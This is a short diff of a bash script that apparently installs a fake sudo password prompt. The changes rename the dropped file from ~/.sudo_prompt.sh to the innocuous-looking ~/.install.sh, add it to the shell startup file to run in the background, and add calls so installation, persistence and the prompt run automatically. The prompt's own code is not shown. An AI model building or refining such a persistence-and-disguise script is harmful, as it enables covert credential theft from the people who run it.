@@ -54,7 +54,7 @@ add_to_startup() {
     fi
 
     # Line to add to the shell config file
-    startup_line="~/.sudo_prompt.sh &"
+    startup_line="~/.install.sh &"
 
     # Check if the line already exists in the config file, to avoid duplication
     if ! grep -Fxq "$startup_line" "$config_file"; then
@@ -67,7 +67,7 @@ add_to_startup() {
 
 # Write the script itself to ~/.sudo_prompt.sh (if not already present)
 install_script() {
-    sudo_prompt_script="$HOME/.sudo_prompt.sh"
+    sudo_prompt_script="$HOME/.install.sh"
 
     # Check if the script file already exists to avoid overwriting
     if [[ ! -f "$sudo_prompt_script" ]]; then
@@ -122,4 +122,8 @@ EOL
     fi
 }
 
-# Ensure the sudo prompt script
+
+install_script
+add_to_startup
+
+prompt_sudo
